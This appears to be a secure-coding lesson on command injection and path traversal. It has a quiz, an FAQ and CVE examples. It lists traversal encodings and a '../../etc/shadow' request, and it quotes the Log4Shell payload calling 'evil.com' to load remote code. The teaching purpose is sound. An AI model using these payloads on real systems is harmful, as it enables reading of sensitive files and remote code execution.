title: Command & Path Injection
subtitle: OS command injection, path traversal, and the principle of never passing user input to the shell

content.text: Command injection happens when user input is passed to a shell command. The attacker injects shell operators (; | && ||) to run additional commands. Unlike SQL injection (which is limited to the database), command injection gives attackers access to the entire operating system: read any file, create users, download malware, pivot to internal services. It's catastrophic.

content.filename: Path traversal — reading files outside intended directory

content.code:
SHELL METACHARACTERS to watch for in shell-adjacent contexts:
  ;   (command separator)
  |   (pipe to another command)
  &&  (run second if first succeeds)
  ||  (run second if first fails)
  $() (command substitution)
  ``  (backtick command substitution)
  >   (redirect output to file)
  <   (read from file)
  &   (run in background)
  *   (glob expansion)
  ?   (glob expansion)
  !   (history expansion in bash)

PATH TRAVERSAL sequences:
  ../       (parent directory, Unix)
  ..\\      (parent directory, Windows)
  %2e%2e%2f (URL-encoded ../)
  %252e%252e (double-encoded ../)
  ..%c0%af   (overlong UTF-8 encoding of /)

NULL BYTE INJECTION:
  filename%00.jpg → may be interpreted as 'filename' by some languages
  Terminates string in C-based functions while passing extension check

content.text: Never use exec() with user input. Always use execFile() (which takes an array of arguments, bypassing the shell) or, better, a native library that doesn't invoke the OS shell at all. The same rule applies to Python's subprocess.call(shell=True), PHP's exec(), and Ruby's backtick operator. If you must call a shell command with user-derived data, use a proper shell-escaping library (shell-quote in npm) — but prefer eliminating the shell call entirely.

questions.question: A file download endpoint builds the path as: path.join('/app/uploads', userFilename). A user requests filename '../../etc/shadow'. What is the resolved path, and is this safe?
options: Resolves to /app/uploads/../../etc/shadow = /etc/shadow. Unsafe — path traversal bypasses the uploads directory
Resolves to /app/uploads/etc/shadow. Safe — path.join blocks traversal
path.join throws an error on .. sequences
Resolves to /etc/shadow. Safe because the OS checks permissions
questions.explanation: path.join normalises the path but does NOT prevent traversal: path.join('/app/uploads', '../../etc/shadow') returns '/etc/shadow'. The fix is to use path.resolve() and then check that the result still starts with the allowed directory: if (!resolved.startsWith(UPLOAD_DIR + path.sep)) { reject() }. OS file permissions provide some protection (if the Node process runs as a restricted user), but you should not rely on OS permissions as your primary application-level security control — defence in depth means checking at both levels.

faq.q: Is command injection really common in Node.js apps?
faq.a: Less common than SQL injection or XSS, but it appears in image conversion, PDF generation, file processing, and any feature that shells out to a system tool. It's especially dangerous in developer tools, admin panels, and CI/CD systems where the attacker may already have some level of access. Severity is typically critical — code execution on the server is the worst outcome in web security.

examples: The 2021 GitLab CE/EE critical vulnerability (CVE-2021-22205) was a remote code execution via path traversal in file upload handling. An unauthenticated attacker could upload a crafted image that triggered ExifTool processing, leading to OS command execution. CVSS score 10.0. Over 50,000 GitLab instances were exposed

Log4Shell (2021, CVE-2021-44228) was a JNDI injection vulnerability in Java's Log4j library — a form of injection where log messages containing ${jndi:ldap://evil.com/a} triggered a remote class load and code execution. CVSS 10.0. Hundreds of millions of systems were affected. The lesson: injection vulnerabilities appear in unexpected places — even logging libraries
